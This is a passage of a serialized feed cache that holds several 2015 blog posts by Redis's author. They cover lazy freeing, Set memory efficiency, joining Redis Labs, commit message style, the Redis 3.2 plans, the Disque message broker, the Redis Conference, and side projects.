<br>All this requires even more drastic internal changes, but the bottom line here is, we have a taboo less. We can compensate object copying times with less cache misses and a smaller memory footprint for aggregated data types, so we are now free to think in terms of a threaded Redis with a share-nothing design, which is the only design that could easily outperform our single threaded one. In the past a threaded Redis was always seen as a bad idea if thought as a set of mutexes in data structures and objects in order to implement concurrent access, but fortunately there are alternatives to get the best of both the worlds. And we have the option to still serve all the fast operations like we did in the past from the main thread, if we want. There should be only to gain performance-wise, at the cost of some contained complexity.
<br>
<br>ETA
<br>—
<br>
<br>I touched a lot of internals, this is not something which is going live tomorrow. So my plan is to call 3.2. what we have already into unstable, do the work to put it into Release Candidate state, and merge this branch into unstable targeting 3.4.
<br>
<br>However before merging, a very scrupulous check for speed regression should be performed. There is definitely more work to do.
<br>
<br>If you want to give it a try check the “lazyfree” branch on Github. Btw be aware that currently I’m working at it very actively so certain things may be at moments totally broken.
<a href=\"http://antirez.com/news/93\">Comments</a>" nil "http://antirez.com/news/93" "489d3961362c69de00071d685d0d73fa") (45 (26588 31767 57625 254000) "http://antirez.com/news/92
" "About Redis Sets memory efficiency " nil "Fri, 28 Aug 2015 09:40:32 +0000" "Yesterday Amplitude published an article about scaling analytics, in the context of using the Set data type. The blog post is here: https://amplitude.com/blog/2015/08/25/scaling-analytics-at-amplitude/
<br>
<br>On Hacker News people asked why not using Redis instead: https://news.ycombinator.com/item?id=10118413
<br>
<br>Amplitude developers have their set of reasons for not using Redis, and in general if you have a very specific problem and want to scale it in the best possible way, it makes sense to implement your vertical solution. I’m not adverse to reinventing the wheel, you want your very specific wheel sometimes, that a general purpose system may not be able to provide. Moreover creating your solution gives you control on what you did, boosts your creativity and your confidence in what you, as a developer can do, makes you able to debug whatever bug may arise in the future without external help.
<br>
<br>On the other hand of course creating system software from scratch is a very complex matter, requires constant developments if there is a wish to actively develop something, or means to have a stalled, non evolving piece of code if there is no team dedicated to it. If it is very vertical and specialized, likely the new system is capable of handling only a slice of the whole application problems, and yet you have to manage it as an additional component. Moreover if it was created by mostly one or a few programmers that later go away from the company, then fixing and evolving it is a very big problem: there isn’t sizable external community, nor there are the original developers.
<br>
<br>Basically writing things in house is not good or bad per se, it depends. Of course it is a matter of sensibility to understand when it’s worth to implement something from scratch and when it is not. Good developers know.
<br>
<br>From my point of view, regardless of what the Amplitude developers final solution was, it is interesting to read the process and why they are not using Redis. One of the concerns they raised is the overhead of the Set data type in Redis. I believe they are right to have such a concern, Redis Sets could be a lot more memory efficient, and weeks before reading the Amplitude article, I already started to explore ways to improve Sets memory efficiency. Today I want to share the plans with you.
<br>
<br>Dual representation of data types
<br>===
<br>
<br>In principle there where plain data structures, implemented more or less like an algorithm text book suggests: each node of the data structure is implemented dynamically allocating it. Allocation overhead, fat pointers, poor cache locality, are the big limits of this basic solution.
<br>
<br>Pieter Noordhuis and I later implemented specialized implementations of Redis abstract data types, to be very memory efficient, using single allocations to hold tens or a few hundreds of elements in a single allocation, sometimes with ad-hoc encodings to better use the space. Those versions of the data structures have O(N) time complexity for certain operations, or sometimes are limited to elements having a specific format (numbers) or sizes.
<br>
<br>So for example when you create an Hash, it starts represented in a memory efficient way which is good for a small number of elements. Later it gets converted to a real hash table if the number of elements reach a given threshold. This means that the memory efficiency of a Redis data type depends a lot on the number of elements it stores.
<br>
<br>The next step: Redis lists
<br>===
<br>
<br>At some point Twitter developers realized that there was no reason to go from an array of elements in a single allocation, representing items in a List, to an actual linked list which is a lot less memory efficient. There is something in the middle: a linked list of arrays representing a few items.
<br>Their implementation does not handle defragmentation when you remove something in the middle. Pieter and I in the past tried to understand if this was worth or not, but we had some feeling the defragmentation effort may not be compensated by the space savings, and a non defragmenting implementation of this idea was too fragile as a general purpose implementation of Redis lists: remove a few elements in the middle and your memory usage changes dramatically.
<br>
<br>Fortunately Matt Stancliff implemented the idea, including the defragmentation part, in an excellent way, and after some experimentation he showed that the new implementation was at least as good as the current implementation in Redis from the POV of performances, and much better from the point of view of memory usage. Moreover the memory efficiency of lists was no longer a function of the size of the list, and there was a single representation to deal with.
<br>
<br>Lists are kinda special since, to have linked lists of small arrays is really an optimal representation that may not map easily to other data types. It is possible to do something like that for Sets and other data types?
<br>
<br>Redis Sets
<br>===
<br>
<br>Sets memory usage is a bit special. They don’t have a specialized representation like all the other Redis data structures for sets composed of strings. So even a very small Set is going to consume a lot of memory. The special representation actually exists and is excellent but only works if the Set is composed of just numbers and is small: in such a case, we represent the Set with a special encoding called “intset”. It is an ordered linear array of integers, so that we can use binary search for testing existence of members. The array automatically changes size of each element depending on the greatest element in the set, so representing a set that has the strings 1, 20, 30, 15 is going to take just one byte per element plus some overhead, because the strings can be represented as numbers, and are inside the 8 bits range. However just add “a” to the set, and it will be converted into a full hash table:
<br>
<br>127.0.0.1:6379> sadd myset 1 2 3 4 5
<br>(integer) 5
<br>127.0.0.1:6379> object encoding myset
<br>\"intset\"
<br>127.0.0.1:6379> sadd myset a
<br>(integer) 1
<br>127.0.0.1:6379> object encoding myset
<br>\"hashtable\"
<br>
<br>Sets of integer are a very used data type in Redis, so it is actually very useful to have that. But why we don’t have a special representation for small sets composed of non numerical strings, like we have for everything else? Well, the idea was that to have a data type with *three* representations was not going to be a good thing from the point of view of Redis internals. If you check t_zset.c o t_set.c you’ll see it require some care to deal with multiple representations. The more you want to abstract away dealing with N representations, the more you no longer have access to certain optimizations. Moreover the List story showed that it was possible to have a single representation with all the benefits. What you lose in terms of scanning the small aggregates containing N elements, you win back because of better cache locality, so it is possible to experiment with things that look like a tragic time/space tradeoff, but in reality are not.
<br>
<br>Specializing Redis hash tables
<br>===
<br>
<br>Big hashes, non numerical (or big) sets, and big sorted sets, are currently represented by hash tables. The implementation is the one inside the dict.c file. It is an hash table implemented in a pretty trivial way, using chaining to resolve collisions. The special things in this hash table implementation are just two: it never blocks in order to rehash, the rehashing process is handled incrementally. I did this in the first months of my VMware sponsorship, and it was a big win in terms of latency, of course. dict.c also implements a special primitive called “scanning” invented by Pieter Noordhuis, which is a cursor based iterator without overheads nor state, but with reasonable guarantees. Apart from that the Redis hash table expects keys and values to be pointers to something, and methods in order to compare and release keys, and to release values.
<br>
<br>This is how you want to design a general purpose hash table: pointers and methods (function pointers) to deal with values everywhere. However Redis data structures have an interesting property: every element in complex data structures are always, semantically strings. Hashes are maps between a string field and a string value. Sets are unordered sets of strings, and so forth.
<br>
<br>What happens if we implement an hash table which is designed in order to store just string keys and string values? Well… it looks like there is a simple way to make such an hash table very memory efficient. We could set the load factor to something greater than 1, for example 10, and if there are 5 buckets in the hash table, each bucket will contain on average 10 elements.
<br>
<br>So each bucket will be something like a linear array of key-value items, with prefixed lengths, in a very similar fashion to the encodings we use for small data types currently. Something like:
<br>
<br>0: <3>foo<3>bar<5>hello<6>world!<0>
<br>1: <8>user:103<3>811 … <0>
<br>2: … <0>
<br>
<br>And so forth. The encoding could be specialized or just something existing like MessagePack. So here the extra work you do in each bucket is hopefully compensated by the better locality you get.
<br>
<br>To implement scanning and incremental rehashing on top of this data structure is viable as well, I did an initial analysis and while it is not possible to just copy the implementation in dict.c it is possible to find other ways to obtain the same effects.
<br>
<br>Note that, technically speaking, it is possible to store pointers in such an hash table: they will be just strings from the point of view of the hash table implementation, and it is possible to signal, in the hash table type, that those are pointers that need special care (for example free-value function pointers or alike). However only testing can say if it’s worth it or not.
<br>
<br>However there are problems that must be solved in order to use this for more than sets, or at least in order to use *only* such a representation, killing the small representations we have currently. For example, the current small representations have a very interesting property: they are already a serialization of themselves, without extra work required: we use this to store data into RDB files, to transfer data between nodes in Redis Cluster, and so forth. The specialized hash table should have the same property hopefully, or at least each single bucket should be already in a serialized format without any post-processing work required. If this is not the case, we could use this new dictionaries only in place of the general hash tables after the expansion, which is already a big win.
<br>
<br>Conclusions
<br>===
<br>
<br>This is an initial idea that requires some time for the design to be improved, validated by an implementation later, and in-depth load tested to guarantee there is no huge regression in certain legitimate workloads. If everything goes well we may end with a Redis server which is a lot more memory efficient than in the past. Such an hash table may also be used in order to store the main Redis dictionary in order to make each key overhead much smaller.
<a href=\"http://antirez.com/news/92\">Comments</a>" nil "http://antirez.com/news/92" "3645da60120c43b677901f434a783dfe") (44 (26588 31766 999795 369000) "http://antirez.com/news/91
" "Thanks Pivotal, Hello Redis Labs " nil "Wed, 15 Jul 2015 11:46:47 +0000" "I consider myself very lucky for contributing to the open source. For me OSS software is not just a license: it means transparency in the development process, choices that are only taken in order to improve software from the point of view of the users, documentation that attempts to cover everything, and simple, understandable systems. The Redis community had the privilege of finding in Pivotal, and VMware before, a company that thinks at open source in the same way as we, the community of developers, think of it.
<br>
<br>Thanks to the Pivotal sponsorship Redis was able to grow, to reach in the latest years a diffusion which I never expected it to reach. However for the final user it always was just a \"pure\" OSS project: go to the community web site, grab a tar ball, read the free documentation, send a pull request, and watch the stream of commits as they happen live.
<br>
<br>In order to not stop this magic from happening, and in order to have enough free time to spend with my family, during these years I made the decision of not starting a Redis company. However I encouraged the creation of an economic ecosystem around Redis. There are multiple companies about Redis doing well at this point. There is one, Redis Labs, that made a remarkable steady work over the years in order to build a very strong company, with a team of developers hacking on the core of Redis, and a great set of products that provide Redis users with the commercial choices they need.
<br>
<br>At some point it started to look like a good idea for me to move to Redis Labs. Running a big cluster of Redis instances and having a set of developers on the Redis core is the key asset for Redis future. We can work together in order to improve Redis faster, with a constant feedback on what happens into the wild of actual users running Redis and the efforts required in order to operate it at scale.
<br>
<br>Redis Labs was willing to continue what VMware and Pivotal started. I'll be able to work as I do currently, spending all my time in the open source side of the project, while Redis Labs continues to provide Redis users with an hassles-free Redis experience of managed instances and products. However because of my close interaction with Redis Labs I believe we'll see much more contributions from Redis Labs developers to the Redis core. Things like the memory reduction pull requests which are going to be part of Redis 3.2, or the improvements to the key eviction process they contributed for Redis 3.0, are a clear example of what happens when you have great developers working at Redis, able to observe a large set of use cases.
<br>
<br>I, Pivotal, and Redis Labs, all agree that this is important for the future of Redis, so I'm officially moving to Redis Labs starting from tomorrow morning. Thank you Pivotal and Redis Labs, we'll have to ship more OSS code in the next years, and this is just great.
<br>
<br>EDIT: Redis Labs press release can be found here: https://redislabs.com/press-releases/redis-creator-salvatore-sanfilippo-antirez-joins-redis-labs
<a href=\"http://antirez.com/news/91\">Comments</a>" nil "http://antirez.com/news/91" "a124b93c06eff7c286be6c1720cb8392") (43 (26588 31766 999563 752000) "http://antirez.com/news/90
" "Commit messages are not titles " nil "Tue, 23 Jun 2015 08:55:22 +0000" "Nor subjects, for what matters. Everybody will tell you to don't add a dot at the end of the first line of a commit message. I followed the advice for some time, but I'll stop today, because I don't believe commit messages are titles or subjects. They are synopsis of the meaning of the change operated by the commit, so they are small sentences. The sentence can be later augmented with more details in the next lines of the commit message, however many times there is *no* body, there is just the first line. How many emails or articles you see with just the subject or the title? Very little, I guess. So for me it is like:
<br>
<br>This is a smart synopsis, as information dense as possible.
<br>
<br>And when needed, this is the long version since:
<br>1. I did this.
<br>2. And resulted into this.
<br>3. And you could reproduce this way.
<br>
<br>So every time I'll be told again to don't put a dot at the end, I'll link to this article.
<br>
<br>But no, it's not just a matter of a dot. If the first line of a commit message is a title, it changes *the way* you write it. It becomes just some text to introduce some more text, without any stress on the information density. Coders gotta code, so if something can be told in a very short way in one line, do it, and reserve the other additional informations for the next line, without sacrificing the first line since \"It's a title\".
<br>
<br>Moreover, programming is the art of writing synopsis, otherwise you end with programs much more complex they should be. So perhaps it's also a good exercise for us.
<a href=\"http://antirez.com/news/90\">Comments</a>" nil "http://antirez.com/news/90" "83c0096a58d1472d408386b075ff1996") (42 (26588 31766 999407 725000) "http://antirez.com/news/89
" "Plans for Redis 3.2 " nil "Fri, 12 Jun 2015 13:53:53 +0000" "I’m back from Paris, DotScale 2015 was a very interesting conference. Before leaving I was working on Sentinel in the context of the unstable branch: the work was mainly about connection sharing. In short, it is the ability of a few Sentinels to scale, monitoring many masters. Before to leave, and now that I’m back, I tried to “secure” a set of features that will be the basis for Redis 3.2. In the next weeks I’ll be focusing developing these features, so I thought it’s worth to share the list with you ASAP.
<br>
<br>Geo hashing API: This work originated from Ardb, that was originally a fork of Redis (https://github.com/yinqiwen/ardb), and was later extracted and improved by Matt Stancliff (https://matt.sh/redis-geo) that ported it to Redis. Open source is cool eh? The code needs a refactoring effort since currently duplicates parts of the sorted set implementation. It is not impossible that I may also change a few things about the API, I’m currently not sure, if there is something to fix, I’ll fix it. But the bottom line is: this is a great feature, now that Matt is no longer contributing to Redis, there is a huge risk to lose this work, so I’m going to do the effort of refactoring, reviewing and merging it as the first of the tasks for Redis 3.2. I think it is a very exciting addition to the Redis API.
<br>
<br>Bloom filters: We’ll get bloom filters in 3.2. I’m not sure if this will be implemented as a String type feature like HyperLogLog are, but more likely as a new special type, since I'm interested in non trivial semantics that are more easy to provide as a new type. I’ve many design ideas for bloom filters, but I’m pretty sure I would like to have the ability to control from the API the accuracy/space tradeoff, perhaps not in the lower level from of specifying number of bits and hash functions to use, but in a more higher level way. Another thing I would love to have in this API is the ability of the bloom filter to auto-depollute itself (using multiple rotating filters or something like that). I’ll read all the available literature and decide what to do, but we’ll get this feature into 3.2.
<br>
<br>Memory PRs: there are two important PRs from RedisLabs to improve Redis memory usage. We’ll get both merged.
<br>
<br>Memory introspection command: A command that provides information about memory, like the LATENCY command but for memory usage. Hints about where is memory consumed, if its just the RSS that is high because of past peak memory usage, hints about amount of memory used by client output buffers, ability to resize the hash tables to save some memory if needed, and so forth.
<br>
<br>Some Redis Cluster multi DC support. This will probably just be a “static” option of Cluster slaves so that they’ll not take part to promotion when the master fails. In this way using CLUSTER FAILOVER TAKEOVER it will be possible to promote all the slaves in a minority partition.
<br>
<br>New List type operations: A few O(1) list operations like LMERGE, and O(N) operations that will be normally used with N very small so that they are most of the times O(1) operations, like operations to move N elements from a list to another.
<br>
<br>AOF safety feature: https://github.com/antirez/redis/pull/2574
<br>
<br>AOF rewrites optionally using an RDB preamble, so that rewriting the AOF and reloading back the content at startup is faster.
<br>
<br>SPOP COUNT option (already implemented, 3.2 will be the first stable versions to get it))
<br>
<br>Redis Cluster redis-trib rebalance command, in order to automatically rehash keys to end with an more homogeneous memory usage between nodes.
<br>
<br>A few things originally planned for 3.2 were ported to 3.0 since they were safe. A recent example is ZADD with support for options like NX and XX. In general it is possible that a few more commands about existing types will be added to Redis 3.2. This is basically a Redis version which is designed to make happy people that wanted more in the API side, since for a while we focused more on the operations aspect of Redis.
<br>
<br>About the ETA, the work is starting Monday, and I hope they’ll not take more time than the end of September, when the first RC will be pushed. Once it is RC, the RC -> Stable transition time is not scheduled, it is a function of the reporting time of critical bugs. Once for a few weeks nobody notices more bad issues, we’ll go stable.
<br>
<br>I’ll follow up with new blog posts about single entries listed above, like for the Geo hashing thing, the bloom filter final implementation and API description, and so forth.
<br>
<br>In the meantime, have fun with Redis 3.0!
<a href=\"http://antirez.com/news/89\">Comments</a>" nil "http://antirez.com/news/89" "ac44ee077a791daa6bfa5e4131f4cc3e") (41 (26588 31766 999122 785000) "http://antirez.com/news/88
" "Adventures in message queues " nil "Sun, 15 Mar 2015 22:32:15 +0000" "EDIT: In case you missed it, Disque source code is now available at http://github.com/antirez/disque
<br>
<br>It is a few months that I spend ~ 15-20% of my time, mostly hours stolen to nights and weekends, working to a new system. It’s a message broker and it’s called Disque. I’ve an implementation of 80% of what was in the original specification, but still I don’t feel like it’s ready to be released. Since I can’t ship, I’ll at least blog… so that’s the story of how it started and a few details about what it is.
<br>
<br>~ First steps ~
<br>
<br>Many developers use Redis as a message queue, often wrappered via some library abstracting away Redis low level primitives, other times directly building a simple, ad-hoc queue, using the Redis raw API. This use case is covered mainly using blocking list operations, and list push operations. Redis apparently is at the same time the best and the worst system to use like that. It’s good because it is fast, easy to inspect, deploy and use, and in many environments it was already one piece of the infrastructure. However it has disadvantages because Redis mutable data structures are very different than immutable messages. Redis HA / Cluster tradeoffs are totally biased towards large mutable values, but the same tradeoffs are not the best ones to deal with messages.
<br>
<br>One thing that is important to guarantee for a message broker is that a message is delivered either at least one time, or at most one time. In short given that to guarantee an exact single delivery of a message (where for delivery we intent a message that was received *and* processed by a worker) is practically impossible, the choices are that the message broker is able to guarantee either 0 or 1 deliveries, or 1 to infinite deliveries. This is often referred as at-most-once semantics, and at-least-once semantics. There are use cases for the first, but the most interesting and practical semantics is the latter, that is, to guarantee that a message is delivered at least one time, and deliver multiple times if there are failures.
<br>
<br>So a few months ago I started to think at some client-side protocol to use a set of Redis masters (without replication or clustering whatsoever) in a way that provides these guarantees. Sometimes with small changes in the way Redis is used for an use case, it is possible to end with a better system. For example for distributed locks I tried to document an algorithm which is trivial to implement but more robust than the single-instance + failover implementation (http://redis.io/topics/distlock).
<br>
<br>However after a few days of work my design draft suggested that it was a better bet to design an ad-hoc system, since the client-side algorithm ended being too complex, non optimal, and certain things I absolutely wanted were impossible or very hard to do. To add more things to Redis sounded like a bad idea, it does a lot of things already, and to cover messaging well I needed things which are very different than the way Redis operates. But why to design a new system given that the world is full of message brokers? Because an impressive number of users were using Redis instead of systems specifically designed for this goal, and this was strange. A few can be wrong, but so many need to get some reason. Maybe Redis low barrier of entry, easy API, speed, were not what most people were accustomed to when they looked at the message brokers landscape. It seems populated by solutions that are either too simple, asking the application to do too much, or too complex, but super full featured. Maybe there is some space for the “Redis of messaging”?
<br>
<br>~ Redis brutally forked ~
<br>
<br>For the first time in my life I didn’t started straight away to write code. For weeks I looked at the design from time to time, converted it into a new system and not a Redis client library, and tried to understand, as an user, what would make me very happy in a message broker. The original use case remained the same: delayed jobs. Disque is a general system, but 90% of times in the design the “reference” was an user that has to solve the problem of sending messages that are likely jobs to process. If something was against this use case, it was removed.
<br>
<br>When the design was ready, I finally started to code. But where to start? “vi main.c”? Fortunately Redis is, in part, a framework to write distributed systems in C. I had a protocol, network libraries, clients handling, node-to-node message bus. To rewrite all this from scratch sounded like a huge waste. At the same time I wanted Disque to be able to completely diverge from Redis in any details possible if this is needed, and I wanted it to be a side project without impacts on Redis itself. So instead of trying the huge undertake of splitting Redis into an actual separated framework, and the Redis implementation, I took a more pragmatic approach: I forked the code, and removed everything that was Redis specific from the source code, in order to end with a skeleton. At this point I was ready to implement my specification.
<br>
<br>~ What is Disque? ~
<br>
<br>After a few months of very non intense work and just 200 commits I’ve finally a system that no longer looks like a toy: it looked like a toy for many weeks so I was afraid of even talking about it, since the probability of me just deleting the source tree was big. Now that most of the idea is working code with tests, I’m finally sure this will be released in the future, and to talk about the tradeoffs I took in the design.
<br>
<br>Disque is a distributed system, by default. Since it is an AP system, it made no sense to have like in Redis a single-node mode and a distributed mode. A single Disque node is just a particular case of a cluster, having just one node.
<br>So this was of the important points in the design: fault tolerant, resistant to partitions, and available no matter how many nodes are still up, aka AP. I also wanted a system that was inherently able to scale in different scenarios, both when the issue is many producers and consumers with many queues, and when instead all this producers and consumers are all focusing on a single queue, that may be distributed into multiple nodes.
<br>
<br>My requirements were telling me aloud one thing… that Disque was going to make a big design sacrifice. Message ordering. Disque only provides best-effort ordering. However because of this sacrifice, there is a lot to gain… tradeoffs are interesting since sometimes they totally open the design space.
<br>
<br>I could continue recounting you what Disque is like that, however a few months ago I saw a comment in Hacker News, written by Jacques Chester, see https://news.ycombinator.com/item?id=8709146 [EDIT: SORRY I made an error cut&pasting the wrong name of Adrian (Hi Adrian, sorry for misquoting you!)]. Jacques, that happens to work for Pivotal like me, was commenting how different messaging systems have very different set of features, properties, and without the details it is almost impossible to evaluate the different choices, and to evaluate if one is faster than the other because it has a better implementation, or simple offers a lot less guarantees. So he wrote a set of questions one should ask when evaluating a messaging system. I’ll use his questions, and add a few more, in order to describe what Disque is, in the hope that I don’t end just hand waving, but providing some actual information.
<br>
<br>Q: Are messages delivered at least once?
<br>
<br>In Disque you can chose at least once delivery (the default), or at most once delivery. This property can be set per message. At most once delivery is just a special case of at least once delivery, setting the “retry” parameter of the message to 0, and replicating the message to a single node.
<br>
<br>Q: Are messages acknowledged by consumers?
<br>
<br>Yes, the only way for a consumer to tell the system the message got delivered correctly, is to acknowledge it.
<br>
<br>Q: Are messages delivered multiple times if not acknowledged?
<br>
<br>Yes, Disque will automatically deliver the message again, after a “retry” time, forever (up to the max TTL time for the message).
<br>When messages are acknowledged, the acknowledge is propagated to the nodes having a copy of the message. If the system believes everybody was reached, the message is finally garbage collected and removed. Acknowledged messages are also evicted during memory pressure.
<br>
<br>Nodes run a best-effort algorithm to avoid to queue the same message multiple times, in order to approximate single delivery better. However during failures, multiple nodes may re-deliver the same message multiple times at the same time.
<br>
<br>Q: Is queueing durable or ephemeral.
<br>
<br>Durable.
<br>
<br>Q: Is durability achieved by writing every message to disk first, or by replicating messages across servers?
<br>
<br>By default Disque runs in-memory only, and uses synchronous replication to achieve durability (however you can ask, per message, to use asynchronous replication). It is possible to turn AOF (similarly to Redis) if desired, if the setup is likely to see a mass-reboot or alike. When the system is upgraded it is possible to write the AOF on disk just for the upgrade in order to don’t lose the state after a restart even if normally disk persistence is not used.
<br>
<br>Q: Is queueing partially/totally consistent across a group of servers or divided up for maximal throughput?
<br>
<br>Divided up for throughput, however message ordering is preserved in a best-effort way. Each message has an immutable “ctime” which is a wall-clock milliseconds timestamp plus an incremental ID for messages generated in the same millisecond. Nodes use this ctime in order to sort messages for delivery.
<br>
<br>Q: Can messages be dropped entirely under pressure? (aka best effort)
<br>
<br>No, however new messages may be refused if there is no space in memory. When 75% of memory is in use, nodes receiving messages try to externally replicate them, just to outer nodes, without taking a copy, but it many not work if also the other nodes are in an out of memory condition.
<br>
<br>Q: Can consumers and producers look into the queue, or is it totally opaque?
<br>
<br>There are commands to “PEEK” into queues.
<br>
<br>Q: Is queueing unordered, FIFO or prioritised?
<br>
<br>Best-effort FIFO-ish as explained.
<br>
<br>Q: Is there a broker or no broker?
<br>
<br>Broker as a set of masters. Clients can talk to whatever node they want.
<br>
<br>Q: Does the broker own independent, named queues (topics, routes etc) or do producers and consumers need to coordinate their connections?
<br>
<br>Named queues. Producers and consumers does not need to coordinate, since nodes use federation to discover routes inside the cluster and pass messages as they are needed by consumers. However the client is provided with hints in case it is willing to relocate where more consumers are.
<br>
<br>Q: Is message posting transactional?
<br>
<br>Yes, once the command to add a message returns, the system guarantees that there are the desired number of copies inside the cluster.
<br>
<br>Q: Is message receiving transactional?
<br>
<br>I guess not, since Disque will try to deliver the same message again if not acknowledged.
<br>
<br>Q: Do consumers block on receive or can they check for new messages?
<br>
<br>Both behaviors are supported, by default it blocks.
<br>
<br>Q: Do producers block on send or can they check for queue fullness?
<br>
<br>The producer may ask to get an error when adding a new message if the message length is already greater than a specified value in the local node it is pushing the message.
<br>
<br>Moreover the producer may ask to replicate the message asynchronously if it want to run away ASAP and let the cluster replicate the message in a best-effort way.
<br>
<br>There is no way to block the consumer if there are too many messages in the queue, and unblock it as soon as there are less messages.
<br>
<br>Q: Are delayed jobs supported?
<br>
<br>Yes, with second granularity, up to years. However they’ll use memory.
<br>
<br>Q: Can consumers and producers connect to different nodes?
<br>
<br>Yes.
<br>
<br>I hope with this post Disque is a bit less vaporware. Sure, without looking at the code it is hard to tell, but if your best feature is out you can already complain at least.
<br>How much of the above is already implemented and working well? Everything but AOF disk persistence, and a few minor things I want to refine in the API, so first release should not be too far, but working at it so rarely it is hard to get super fast.
<a href=\"http://antirez.com/news/88\">Comments</a>" nil "http://antirez.com/news/88" "6ab545e6f53eba5bd9611d76724f4d36") (40 (26588 31766 998521 924000) "http://antirez.com/news/87
" "Redis Conference 2015 " nil "Tue, 10 Mar 2015 09:22:20 +0000" "I’m back home, after a non easy trip, since to travel from San Francisco to Sicily is kinda NP complete: there are no solutions involving less than three flights. However it was definitely worth it, because the Redis Conference 2015 was very good, SF was wonderful as usually and I was able to meet with many interesting people. Here I’ll limit myself to writing a short account of the conference, but the trip was also an incredible experience because I discovered old and new friends, that are not just smart programmers, but also people I could imagine being my friends here in Sicily. I never felt alone while I was 10k kilometers away from my home.
<br>
<br>The conference was organized by RackSpace in a magistral way, with RedisLabs, Heroku, and Hulu, sponsoring it as well. I can’t say thank you enough times to everybody. Many people traveled from different parts of US and outside US to SF just for a couple of days, the venue was incredibly cool, and everything organized in the finest details.
<br>
<br>There was even an incredible cake for the Redis 6th birthday :-)
<br>
<br>However the killer features of the conference were, the number and the quality of the attenders (mostly actual Redis users), around 250 people, and the quality of the talks. The conference was free, even if it did not looked like a free conference at all, at any level. An incredible stage where to talk, very high quality food, plenty of space. All this honestly helped to create a setup for interesting exchanges. Everybody was using Redis for something, to get actual things done, and a lot of people shared their experiences. Among the talks I found Hulu and Heroku ones extremely interesting, because they covered details about different use cases and operational challenges. I also happen to agree with Bill Andersen (from RackSpace) vision on benchmarking Redis in a use-case oriented fashion, even if I missed the initial part of his talk because I was being interviewed, but the cool thing is, there will be recordings of the talks, so it will be possible for everybody to watch them when available at the conf site, which is, http://redisconference.com
<br>
<br>I was approached by several VeryLargeCompanies recounting stories of how they are using or are going to use Redis to do VeryLargeUseCase. Basically at this point Redis is everywhere.
<br>
<br>Redis Conference was a big gift to the Redis community… and in some way it shows very well how much there is a Redis outside Redis, I mean, at this point it has a life outside the borders of the server and client libraries repositories. It is a technology with many users that exchange ideas and that work with it in different ways: internally to companies to provide it as a technology to cover a number of use cases, and also in the context of cloud providers, that are providing it as a service to other companies.
<br>
<br>One thing I did not liked was Matt Stancliff talk. He tried to uncover different problems in the Redis development process, and finally proposed the community to replace me as the project leader, with him. In my opinion what Matt actually managed to do was to cherry-pick from my IRC, Twitter and Github issues posts in a very unfair way, in order to provide a bad imagine of myself. I think this was a big mistake. Moreover he did the talk as the last talk, not providing a right to reply. Matt and I happen to be persons with very different visions in many ways, however Redis is a project I invested many years into, and I’m not going to change my vision, I’m actually afraid I merged some code under pressure that I now find non well written and designed.
<br>
<br>What prevents Redis for becoming a monoculture is its license, if the community at some point really believes it is possible to do much better, or simply to do things in a very different way, some forks will appear, and darwinian selection will work to make sure we have the best Redis possible. Technical leadership is a reward for the work you are capable to do, is not asked at conferences. Moreover technology is not just code, is also about human interactions, and life is too short to interact with people we don’t share the same fundamental values of what a good behavior is.
<br>
<br>Well, even if this left some bitter taste, overall the Redis Conference was a magical experience, and even Matt talk actually helped me to understand what to do in the future and what I want for this project. Thank you to who made it possible and to all the attenders, I hope to see you again next year.
<a href=\"http://antirez.com/news/87\">Comments</a>" nil "http://antirez.com/news/87" "da193f963d12c92ea6a198a21b50ecb2") (39 (26588 31766 998255 604000) "http://antirez.com/news/86
" "Side projects " nil "Thu, 26 Feb 2015 12:48:06 +0000" "Today Redis is six years old. This is an incredible accomplishment for me, because in the past I switched to the next thing much faster. There are things that lasted six years in my past, but not like Redis, where after so much time, I still focus most of my everyday energies into.
<br>
<br>How did I stopped doing new things to focus into an unique effort, drastically monopolizing my professional life? It was a too big sacrifice to do, for an human being with a limited life span. Fortunately I simply never did this, I never stopped doing new things.
<br>
<br>If I look back at those 6 years, it was an endless stream of side projects, sometimes related to Redis, sometimes not.
<br>
<br>1) Load81, children programming environment.
<br>2) Dump1090, software defined radio ADS-B decoder.
<br>3) A Javascript ray tracer.
<br>4) lua-cmsgpack, C implementation of msgpack for Lua.
<br>5) linenoise line editing library. Used in Redis, but well, was not our top priority.
<br>6) lamernews, Redis-based HN clone.
<br>7) Gitan, a small Git web interface.
<br>8) shapeme, images evolver using simulated annealing.
<br>9) Disque, a distributed queue (work in progress right now).
<br>
<br>And there are much more throw-away projects not listed here.
<br>The interesting thing is that many of the projects listed above are not random hacking efforts that had as an unique goal to make me happy. A few found their way into other people’s code.
<br>
<br>Because of the side projects, I was able to do different things when I was stressed and impoverished from doing again and again the same thing. I could later refocus on Redis, and find again the right motivations to have fun with it, because small projects are cool, but to work for years at a single project can provide more value for others in the long run.
<br>
<br>So currently I’m using something like 20% of my time to hack on Disque, a distributed message queue. So only 80% is left for Redis development, right? Wrong. The deal is between 80% of focus on Redis and 20% on something else, or 0% of focus on Redis in the long term, because in order to have a long term engagement, you need a long term alternative to explore new things.
<br>
<br>Side projects are the projects making your bigger projects possible. Moreover they are often the start of new interesting projects. Redis itself was a side project of LLOOGG. Sometimes you stop working at your main project because of side projects, but when this happens it is not because your side project captured your focus, it is because you managed to find a better use for your time, since the side project is more important, interesting, and compelling than the main project.
<br>
<br>Redis is six years old today, but is aging well: it continues to capture the attention of more developers, and it continues to improve in order to provide a bit more value to users every week. However for me, more users, more pull requests, and more pressure, does not mean to change my setup. What Redis is today is the sum of the work we put into it, and the endurance in the course of six years. To continue along the same path, I’ll make sure to have a few side projects for the next years.
<br>
<br>UPDATE: Damian Janowski provided an incredible present for the Redis community today, the renewed Redis.io web site is online now! http://redis.io. Thanks Damian!
<br>
<br>HN comments here: https://news.ycombinator.com/item?id=9112250
<a href=\"http://antirez.com/news/86\">Comments</a>" nil "http://antirez.com/news/86" "5ec8d6e3fcce4110e02311b87bc9eaa9") (38 (26588 31766 997447 683000) "http://antirez.com/news/85
" "Why we =?utf-8?Q?don=E2=80=99t?= have benchmarks comparing Redis with other DBs " nil "Thu, 29 Jan 2015 09:21:41 +0000" "Redis speed could be one selling point for new users, so following the trend of comparative “advertising” it should be logical to have a few comparisons at Redis.io. However there are two problems with this. One is of goals: I don’t want to convince developers to adopt Redis, we just do our best in order to provide a suitable product, and we are happy if people can get work done with it, that’s where my marketing wishes end. There is more: it is almost always impossible to compare different systems in a fair way.
<br>
<br>When you compare two databases, to get fair numbers, they need to share *a lot*: data model, exact durability guarantees, data replication safety, availability during partitions, and so forth: often a system will score in a lower way than another system since it sacrifices speed to provide less “hey look at me” qualities but that are very important nonetheless. Moreover the testing suite is a complex matter as well unless different database systems talk the same exact protocol: differences in the client library alone can contribute for large differences.
<br>
